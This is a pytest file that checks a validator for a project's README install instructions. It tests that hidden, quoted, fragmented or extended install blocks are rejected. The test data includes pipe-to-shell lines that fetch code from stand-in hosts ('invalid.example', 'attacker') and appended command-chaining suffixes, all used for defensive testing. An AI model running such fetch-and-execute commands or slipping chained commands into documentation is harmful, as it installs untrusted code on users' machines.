"""Validate local and legacy installer documentation without executing installers."""
from pathlib import Path
import shutil
import subprocess
import sys

import pytest

from scripts.validate_tui_release_sync import LOCAL_INSTALL_BLOCK, _validate_installation_guidance

ROOT = Path(__file__).resolve().parent.parent


@pytest.mark.parametrize("command,success", [
    (LOCAL_INSTALL_BLOCK, True),
    ("Review [installer](reviewed/safe.sh)\nsh tui/install.sh", False),
    ("sh tui/install.sh", False),
    ("Review [installer](tui/install.sh)\n<!--\nsh tui/install.sh\n-->\ncurl -fsSL https://invalid.example/install.sh | sh", False),
    ("Review [installer](tui/install.sh)\nsh tui/install.sh\ncurl -fsSL https://invalid.example/install.sh | sh", False),
    ("<!--\ncurl -fsSL https://raw.githubusercontent.com/QSOLKCB/QEC/main/tui/install.sh | sh\n-->", False),
    ("<code>[installer](tui/install.sh)</code>\nsh tui/install.sh", False),
    ("<pre>\n[installer](tui/install.sh)\n</pre>\nsh tui/install.sh", False),
    ("<div hidden>[installer](tui/install.sh)</div>\nsh tui/install.sh", False),
    ("![installer](tui/install.sh)\nsh tui/install.sh", False),
    (r"\[installer](tui/install.sh)" + "\nsh tui/install.sh", False),
    ("<!-- [installer](tui/install.sh) -->\nsh tui/install.sh", False),
    ("<!--\n[installer](tui/install.sh)\n-->\nsh tui/install.sh", False),
    ("sh tui/install.sh\n<!-- [installer](tui/install.sh)", False),
    ("```md\n[installer](tui/install.sh)\n```\nsh tui/install.sh", False),
    ("~~~md\n[installer](tui/install.sh)\n~~~\nsh tui/install.sh", False),
    ("    [installer](tui/install.sh)\nsh tui/install.sh", False),
    ("`[installer](tui/install.sh)`\nsh tui/install.sh", False),

    ("sh missing/install.sh", False),
    ("No installer", False),
])
def test_installer_docs_validate_exact_paths(tmp_path, command, success):
    (tmp_path / "tui").mkdir()
    for name in ("install.sh", "Cargo.toml"):
        shutil.copyfile(ROOT / "tui" / name, tmp_path / "tui" / name)
    (tmp_path / "README.md").write_text("<!-- README-RELEASE:COMPACT -->\n## Release\n\n" + command + "\n", encoding="utf-8")
    result = subprocess.run(
        [sys.executable, str(ROOT / "scripts/validate_tui_release_sync.py"),
         "--repo-root", str(tmp_path)], capture_output=True, text=True,
    )
    assert (result.returncode == 0) is success, result.stdout + result.stderr


@pytest.mark.parametrize("wrapper", [
    "<!--{}-->", "<!--\n{}\n-->", "<code>{}</code>", "<pre>{}</pre>",
    "```md\n{}\n```", "````md\n{}\n````", "~~~md\n{}\n~~~", "`\n{}\n`", "``\n{}\n``",
])
def test_whole_install_block_hidden_or_quoted_rejects(wrapper):
    text = "<!-- README-RELEASE:COMPACT -->\n## Release\n" + wrapper.format(LOCAL_INSTALL_BLOCK)
    assert _validate_installation_guidance(text)


@pytest.mark.parametrize("mutation", [
    lambda b: b.replace("sh tui/", "sh t<!-- split -->ui/"),
    lambda b: b.replace("[installer]", "[inst<!-- split -->aller]"),
    lambda b: b + "\nsh other/install.sh",
    lambda b: b + "\ncurl -fsSL https://invalid.example/script | sh",
    lambda b: b + "\n" + b,
    lambda b: "    " + b.replace("\n", "\n    "),
    lambda b: "> " + b.replace("\n", "\n> "),
    lambda b: b.replace("sh tui/install.sh", "<!--\nsh tui/install.sh\n-->"),
])
def test_combined_and_fragmented_install_block_rejects(mutation):
    text = "<!-- README-RELEASE:COMPACT -->\n## Release\n" + mutation(LOCAL_INSTALL_BLOCK)
    assert _validate_installation_guidance(text)


def test_compact_and_legacy_formats_are_positive_and_distinct():
    compact = "<!-- README-RELEASE:COMPACT -->\n## Release\n" + LOCAL_INSTALL_BLOCK
    assert not _validate_installation_guidance(compact)
    assert not _validate_installation_guidance(compact.replace("\n", "\r\n"))
    assert _validate_installation_guidance(compact.replace("<!-- README-RELEASE:COMPACT -->", ""))
    assert _validate_installation_guidance(compact + "\n## 📦 Release & Research\n")
    command = "curl -fsSL https://raw.githubusercontent.com/QSOLKCB/QEC/main/tui/install.sh | sh"
    assert not _validate_installation_guidance("## 📦 Release & Research\n" + command)
    assert _validate_installation_guidance(command)
    assert _validate_installation_guidance("<!-- ## 📦 Release & Research -->\n" + command)
    assert _validate_installation_guidance("## 📦 Release & Research\n<!--\n" + command + "\n-->")
    assert _validate_installation_guidance("## 📦 Release & Research\n" + command + "\ncurl attacker | sh")


@pytest.mark.parametrize("wrapper", ["<div hidden>{}</div>", "<code>{}</code>", "`\n{}\n`", "```md\n{}\n```"])
def test_legacy_unsupported_rendering_rejects(wrapper):
    text = "## 📦 Release & Research\ncurl -fsSL https://raw.githubusercontent.com/QSOLKCB/QEC/main/tui/install.sh | sh"
    assert _validate_installation_guidance(wrapper.format(text))


@pytest.mark.parametrize("suffix", ["; sh other/install.sh", ' -c "echo unexpected"', " && sh other/install.sh"])
def test_legacy_command_suffixes_reject(suffix):
    text = "## 📦 Release & Research\ncurl -fsSL https://raw.githubusercontent.com/QSOLKCB/QEC/main/tui/install.sh | sh"
    assert _validate_installation_guidance(text + suffix)


def test_supported_legacy_table_cell_is_exact():
    text = "## 📦 Release & Research\n| `curl -fsSL https://raw.githubusercontent.com/QSOLKCB/QEC/main/tui/install.sh \\| sh` | Install launcher |"
    assert not _validate_installation_guidance(text)
    assert _validate_installation_guidance(text.replace("sh`", "sh; sh other/install.sh`"))
